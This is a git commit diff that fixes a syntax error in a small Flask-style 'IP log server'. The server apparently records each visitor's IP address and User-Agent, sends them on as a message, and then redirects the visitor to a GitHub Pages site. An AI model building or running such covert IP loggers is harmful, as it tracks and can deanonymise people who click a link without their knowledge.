7fb3f8eb887fa12e05362a2ca619d994620efff2
GENGAOG1 <g9645427@outlook.de>
2026-07-15 09:34:00 +0200

    Ip log server.py

--- Ip log server.py
+++ Ip log server.py
@@ -25,7 +25,7 @@ def log_ip():
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     })
 
-    return redirect("https://gengaog.github.io/-/"
+    return redirect("https://gengaog.github.io/-/")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
